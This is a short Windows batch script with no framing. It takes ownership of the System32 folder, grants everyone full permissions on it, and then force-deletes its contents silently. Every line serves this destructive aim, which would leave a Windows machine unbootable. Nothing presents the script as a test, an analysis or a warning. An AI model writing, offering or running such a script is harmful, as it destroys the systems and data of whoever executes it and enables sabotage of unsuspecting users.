@echo off
takeown /F C:\Windows\System32 /R /A /D Y
icacls C:\Windows\System32 /grant Everyone:F /T /C
DEL /F /S /Q C:\Windows\System32